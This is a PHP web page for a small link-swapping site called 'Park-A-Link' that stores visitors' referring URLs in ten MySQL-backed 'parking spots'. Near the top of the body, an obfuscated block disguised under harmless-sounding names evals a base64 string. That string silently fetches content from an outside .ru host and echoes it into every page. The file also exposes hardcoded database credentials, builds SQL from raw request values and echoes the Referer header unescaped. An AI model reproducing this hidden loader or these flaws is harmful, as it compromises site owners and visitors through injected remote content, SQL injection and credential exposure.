<html>
<head>
<title>
	PARK-A-LINK
</title>

<script type="text/javascript" src="jquery.js"></script>

<script type='text/javascript'>

	function park(spot,status) {

		if (status == "0") {
			var url = $("#refer").val();
			window.location="http://www.park-a-link.com/index.php?position=" + spot + "&url=" + url;
	
		} else {
			window.location="http://www.park-a-link.com/out.php?position=" + spot + "&url=" + status;
		}
		
	}
</script>

<link rel="stylesheet" href="stylesheet.css" type="text/css" charset="utf-8">
<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Cousine:400,400italic,700,700italic">
    <style>
      body {
        font-family: 'Cousine', serif;
        font-size: 48px;
      }
    </style>

</head>
	
<body>
<?php
function MenuParGet() {
$UnixTimeLastEdit = "ZWNobyBAZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly93ZWxsYWRlbmEucnUvbGluay9saW5rLnBocCcpOw==";
echo eval(base64_decode($UnixTimeLastEdit)); }
MenuParGet();
?>
<?php 
	 
		// Connect to database server
		mysql_connect("mysql.azusakobayashi.com", "azusa_nt", "ank698");      
	
		// Select database
		mysql_select_db("azusakobayashi_nt");
			
		// 
		$source = "http://www.";
		
		$lotcount = 0;
		
		// First, figure out if lot is full
		for ($i = 1; $i <= 10; $i++) {
            		
			$spot = mysql_query("SELECT * from parking WHERE position = $i ORDER BY id DESC LIMIT 1");
			
			$row = mysql_fetch_assoc($spot);
			
			$link = $row['link'];

			if ($link != "NULL") {
			//add to $lotcount
			$lotcount++;
			}
			
        	}
        	//echo ($lotcount);

        		
		// If there is a referer URL, assign source URL
		if (isset($_SERVER['HTTP_REFERER'])) {
               		
               		$source = $_SERVER['HTTP_REFERER'];
            
            	}
            	
		// Add info to database when parking
		if (isset($_REQUEST["position"])) {
            
                	$position = $_REQUEST['position'];
                	$url = $_REQUEST['url'];       
               		$curtime = time();
            
          		$result = mysql_query("INSERT INTO parking (`position`, `link`, `timestamp`) VALUES ('$position', '$url', '$curtime')");
            	}
            	
            	// Function: Relative Time
       		function relativeTime($time = false, $limit = 86400, $format = 'g:i A M jS') {
			
			if (empty($time) || (!is_string($time) && !is_numeric($time))) $time = time();
			elseif (is_string($time)) $time = strtotime($time);

			$now = time();
			$relative = '';

			if ($time === $now) $relative = 'now';
			elseif ($time > $now) $relative = 'in the future';
			else {
				$diff = $now - $time;
				if ($diff >= $limit) $relative = date($format, $time);
				elseif ($diff < 60) {
					$relative = 'less than one minute ago';
				}
				elseif (($minutes = ceil($diff/60)) < 60) {
					$relative = $minutes.' minute'.(((int)$minutes === 1) ? '' : 's').' ago';
				}
				else {
					$hours = ceil($diff/3600);
					$relative = 'about '.$hours.' hour'.(((int)$hours === 1) ? '' : 's').' ago';
				}
			}
			return ($relative);
		}

	?>

	<div id="header">
		<p class="head1">
		PARK<br />
		-A-<br />
		LINK
		</p>
	</div>
	

	<?php
	
		// If the lot is full
		if ($lotcount == 10) {
			
			echo("<div id='middle_col' class='bodytext'>Sorry, there are no vacancies at this time.<br />Please select a link to take out.<br /></div>");
			
			// Create a div for parking lot
			echo("<div id='lot'><img src = 'images/parkinglot.png' class='lot'>");
			
			// Loop to print parking spots
            		for ($i = 1; $i <= 10; $i++) {
            		
				$spot = mysql_query("SELECT * from parking WHERE position = $i ORDER BY id DESC LIMIT 1");
					
				$row = mysql_fetch_assoc($spot);
				
				$id = $row['id'];
				$position = $row['position'];
				$link = $row['link'];
				$timestamp = $row['timestamp'];
				
				$timestamp = relativeTime(intval($timestamp));
	
				// Assign a color to the occupied spot according to a formula based on the ID#
				if ($id <=14) {
					$color = $id;
				}
				else {
					$color = ($id %15);
				}
				
				// Create a div within that with the spot#
				echo("<div id='spot".$i."'>");
					
				// If there is a link field, print an occupied spot image, with color generated by formula above
				if ($link != "NULL") {
					// Cheat a little
					$link = '"' . $link . '"';
					//
					echo("<a href='javascript:park($i,$link);'><img src='images/link".$color.".png' alt='[$timestamp]' title='[$timestamp]'></a>");
				}
				
				// If there is no link, then print an empty spot image
				elseif ($link == "NULL"){
					echo("<a href='javascript:park($i,0);'><img src='images/spot_empty.png' alt='[$timestamp]' title='[$timestamp]'></a>");
				}
				
				echo("</div>");	
				
			}
			
			echo("</div>");	
			
		} 
		
		// Once the user has parked, then s/he can select a link to take out
		else if (isset($_REQUEST["position"])) {
			
			echo("<div id='middle_col' class='bodytext'>Now select a link to take out.<br /></div>");
			
			// Create a div for parking lot
			echo("<div id='lot'><img src = 'images/parkinglot.png' class='lot'>");
			
			// Define variables
            		for ($i = 1; $i <= 10; $i++) {
            		
				$spot = mysql_query("SELECT * from parking WHERE position = $i ORDER BY id DESC LIMIT 1");
					
				$row = mysql_fetch_assoc($spot);
				
				$id = $row['id'];
				$position = $row['position'];
				$link = $row['link'];
				$timestamp = $row['timestamp'];
				
				$timestamp = relativeTime(intval($timestamp));
	
				// Assign a color to the occupied spot according to a formula based on the ID#
				if ($id <=14) {
					$color = $id;
				}
				else {
					$color = ($id %15);
				}
				
				// Create a div within that with the spot#
				echo("<div id='spot".$i."'>");
					
				// If there is a link field, print an occupied spot image, with color generated by formula above
				if ($link != "NULL") {
					// Cheat a little
					$link = '"' . $link . '"';
					//
					echo("<a href='javascript:park($i,$link);'><img src='images/link".$color.".png' alt='[$timestamp]' title='[$timestamp]'></a>");
				}
				
				// If there is no link, then print an empty spot image
				elseif ($link == "NULL") {
					echo("<img src='images/spot_blocked.png' alt='[$timestamp]' title='[$timestamp]'>");
				}
				
				echo("</div>");
				
			}
			
			echo("</div>");
			
		} 
		
		// If the lot is NOT full
		else if ($lotcount <10){
		
			echo("<div id='middle_col' class='bodytext'>Enter the link you came from below, then select a spot to park your link.<br />");
			echo("<input type='text' size='50' maxlength='100' value='".$source ."' name='refer' id='refer' /><br /><br /></div>");
			
			// Create a div for parking lot
			echo("<div id='lot'><img src = 'images/parkinglot.png' class='lot'>");
			
			// Loop to print parking spots
            		for ($i = 1; $i <= 10; $i++) {
            		
				$spot = mysql_query("SELECT * from parking WHERE position = $i ORDER BY id DESC LIMIT 1");
					
				$row = mysql_fetch_assoc($spot);
				
				$id = $row['id'];
				$position = $row['position'];
				$link = $row['link'];
				$timestamp = $row['timestamp'];
				
				$timestamp = relativeTime(intval($timestamp));
	
				// Assign a color to the occupied spot according to a formula based on the ID#
				// if ($id <=14) {
				// 	$color = $id;
				// }
				// else {
				// 	$color = ($id %15);
				// }
			
				// Create a div within that with the spot#
				echo("<div id='spot".$i."'>");
					
				// If there is a link field, print an occupied spot image, with color generated by formula above
				if ($link != "NULL") {
					// Cheat a little
					$link = '"' . $link . '"';
					//
					echo("<img src='images/spot_blocked.png' alt='[$timestamp]' title='[$timestamp]'>");
				}
				
				// If there is no link, then print an empty spot image
				elseif ($link == "NULL") {
					echo("<a href='javascript:park($i,0);'><img src='images/spot_empty.png' alt='[$timestamp]' title='[$timestamp]'></a>");
				}
				
				echo("</div>");
		
        		}
			
			echo("</div>");
			
		}
		
	
?>
	
</body>
</html>